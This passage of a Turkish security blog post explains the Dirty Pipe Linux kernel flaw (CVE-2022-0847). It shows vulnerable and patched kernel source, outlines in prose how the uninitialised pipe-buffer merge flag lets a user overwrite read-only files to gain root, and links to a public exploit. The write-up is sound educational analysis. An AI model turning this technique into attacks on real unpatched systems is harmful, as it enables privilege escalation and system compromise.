<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="cm">/* merge with the last one */</span><span class="w"></span>
<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="n">i_head</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">i_head</span><span class="p">,</span><span class="w"> </span><span class="n">p_tail</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="p">;</span><span class="w"></span>
<span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p>YukarÄ±da buffer yapÄ±sÄ± iÃ§erisinde flagâ€™in doÄŸru dÃ¼zgÃ¼n biÃ§imde initialize edilmediÄŸini gÃ¶rmekteyiz. DananÄ±n kuyruÄŸu da burada kopuyor iÅŸte. Burada yukarÄ±da bahsettiÄŸimiz gibi verimlilik iÃ§in okuma iÅŸlemi splice ile yapÄ±lÄ±yor ve ilgili sistem Ã§aÄŸrÄ±sÄ± da veriyi(bytelarÄ±) almak yerine aslÄ±nda o veriyi tutan memory pageâ€™ini deÄŸer olarak alÄ±yor. bknz: call by reference. Tabi bu kÄ±sÄ±mda ayrÄ±ca Copy on writeâ€™a da deÄŸinmek gerekiyor ama bÃ¶yle gidersek iÅŸin iÃ§inden bu yazÄ± iÃ§erisinde Ã§Ä±kamayÄ±z. Orada da DirtyCowâ€™u aÃ§Ä±klamak elzem olur. Bu konuda TÃ¼rkÃ§e yazÄ± var mÄ± bilmiyorum araÅŸtÄ±rabilirsiniz diye dÃ¼ÅŸÃ¼nÃ¼yorum. Bana sevgili Emrah kardeÅŸim anlattÄ±ÄŸÄ± iÃ§in ayrÄ±ca teÅŸekkÃ¼r ederim. Her neyse devam edelim.</p>
<p>Ä°ÅŸlem boyunca flagin initialize(ilk deÄŸer verme?) edilmediÄŸini sÃ¶ylemiÅŸtik. Bu sebeple biz boruyu daha doÄŸrusu bufferdaki tÃ¼m verileri ilgili FLAG ile doldurup boÅŸaltabiliriz. Bu boÅŸaltmadan sonra ise biz tÃ¼m bufferdaki verilere â€œ<strong>PIPE_BUF_FLAG_CAN_MERGEâ€</strong> bayraÄŸÄ±nÄ± iÅŸaretlediÄŸimiz iÃ§in kÃ¼Ã§Ã¼k bir alana(1 baytcÄ±k) yazabiliriz. Ä°lgili iÅŸlemlerin kernel Ã¼zerinde gerÃ§ekleÅŸtirildiÄŸini unutmayalÄ±m. Herhangi bir denetime tabi deÄŸil bu aÅŸamada. Bu sebeple de istediÄŸimiz dosyaya (read only) yazÄ±p root olabiliriz. </p>
<p>Exploit kodunu incelemek iÃ§in:</p>
<p><a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143</a></p>
<p>AslÄ±nda patchten sonra ve Ã¶ncesi iÃ§in de bir kod bloÄŸu eklemem gerek sanÄ±rÄ±m bu sebeple aÅŸaÄŸÄ±ya fixlenmemiÅŸ ve fixlenmiÅŸ kaynak kodunu ekliyorum. </p>
<p>Vulnerable:</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>

<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="n">i_head</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">i_head</span><span class="p">,</span><span class="w"> </span><span class="n">p_tail</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"> </span><span class="c1">// Bu kÄ±sÄ±ma dikkat edin. </span>
<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w"> </span><span class="c1">// </span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>

<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="p">;</span><span class="w"></span>
<span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p><a href="https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367">https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367</a></p>
<p>FixlenmiÅŸ hali:</p>
<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">idx</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="cm">/* merge with the last one */</span><span class="w"></span>
<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">next_idx</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">curbuf</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">nrbufs</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">nrbufs</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// Burada tekrar initialize ediliyor.</span>
<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"> </span><span class="c1">// </span>
<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">idx</span><span class="p">;</span><span class="w"></span>
<span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p><a href="https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339">https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339</a></p>
<p>Android tarafÄ±ndaki fix de aynÄ± ÅŸekilde geÃ§iyor. </p>
<p><a href="https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c">https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c</a></p>
<p><a href="https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c">https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c</a></p>
<h2>TarihÃ§esi</h2>
<p>KÄ±saca bahsedersek (direkt wikiden alÄ±yorum).</p>
<p>Konsept ilk olarak â€œ<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>â€ tarafÄ±ndan ortaya atÄ±lÄ±yor. 1973 yÄ±lÄ±nda ise fikri Ken Thomson tarafÄ±ndan Linuxâ€™a <strong>pipe()</strong> sistem Ã§aÄŸrÄ±sÄ±yla, Linux V3 ile implemente ediliyor. Douglas Mcllroy abimiz Ken Thomsonâ€™a â€œ<strong>|</strong>â€ notasyonu sebebiyle respect Ã§akmayÄ± da unutmuyor tabi ki. </p>
<h2>Son</h2>
<p>YazÄ±nÄ±n son kÄ±sÄ±mlarÄ± sanki boÅŸ kaÄŸÄ±dÄ± doldurmaya Ã§alÄ±ÅŸan Ã¶ÄŸrenci gibi oldu ama gerekli olur diye eklemek istedim. GÃ¶zlerinizi bozduysam affola.</p>
<p>Klasik olarak yazÄ± sonu ÅŸarkÄ±sÄ±nÄ± ekleyip bu yazÄ±yÄ± sonlandÄ±ralÄ±m. Bu sefer yine karar veremeyip 2 tane ÅŸarkÄ± ekliyorum. OkuduÄŸunuz iÃ§in teÅŸekkÃ¼rler:</p>
<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="o">!</span><span class="p">[</span><span class="n">Pera</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Sensiz</span><span class="w"> </span><span class="n">Ben</span><span class="p">](</span><span class="n">https</span><span class="o">:</span><span class="c1">//res.cloudinary.com/marcomontalbano/image/upload/v1696975449/video_to_markdown/images/youtube--5wzntE1XNrs-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://www.youtube.com/watch?v=5wzntE1XNrs &quot;Pera - Sensiz Ben&quot;)</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="p">[</span><span class="o">!</span><span class="p">[</span><span class="n">Murat</span><span class="w"> </span><span class="n">YÄ±lmazyÄ±ldÄ±rÄ±m</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">AdsÄ±z</span><span class="w"> </span><span class="n">Ã–zlem</span><span class="p">](</span><span class="n">https</span><span class="o">:</span><span class="c1">//res.cloudinary.com/marcomontalbano/image/upload/v1696975533/video_to_markdown/images/youtube--N-bj9HpGTOA-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://www.youtube.com/watch?v=N-bj9HpGTOA &quot;Murat YÄ±lmazyÄ±ldÄ±rÄ±m - AdsÄ±z Ã–zlem&quot;)</span>
</code></pre></div>

<h2>Referanslar</h2>
<hr>
<ol>
<li><a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">https://en.wikipedia.org/wiki/Pipeline_(Unix)</a></li>
<li><a href="https://tldp.org/LDP/lpg/node10.html">https://tldp.org/LDP/lpg/node10.html</a></li>
<li><a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/</a></li>
<li><a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></li>
</ol>
        </article>

        <footer>
            <p>This entry is posted in <a href="https://enesergun.net/category/linux.html">linux</a>.</p>
        </footer>

<div class="comments">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = '0x656e';
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

    </div>


<footer class="blog-footer">

    <ul class="nav">
            <li><a href="https://devilinside.me/"> EÅŸelyon</a></li>
            <li><a href="https://medium.com/@brkalbyrk"> Berk Albayrak</a></li>
            <li><a href="https://ahmtglr.wordpress.com/"> Ahmet GÃ¼ler</a></li>
            <li><a href="https://kaganisildak.com/"> KaÄŸan IÅŸÄ±ldak</a></li>
            <li><a href="https://eybisi.run/"> Eybisi</a></li>
            <li><a href="https://onur.im/"> Onur Aslan</a></li>
            <li><a href="https://canyoupwn.me/"> Canyoupwn.me</a></li>
            <li><a href="https://www.oguzozkeroglu.com"> OÄŸuz Ã–zkeroÄŸlu</a></li>
            <li><a href="https://aligoren.com"> Ali GÃ¶ren</a></li>
            <li><a href="https://0xf61.gitlab.io/"> Emir Kurt</a></li>
<br>
            <li><a href="www.twitter.com/eness_ergun">Twitter</a></li>
            <li><a href="info@enesergun.net">Mail</a></li>
    </ul>

    <p class="disclaimer">
    Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/hdra/Pelican-Cid">Cid</a> theme.
    </p>
</footer>
            </div>
    </body>
</html>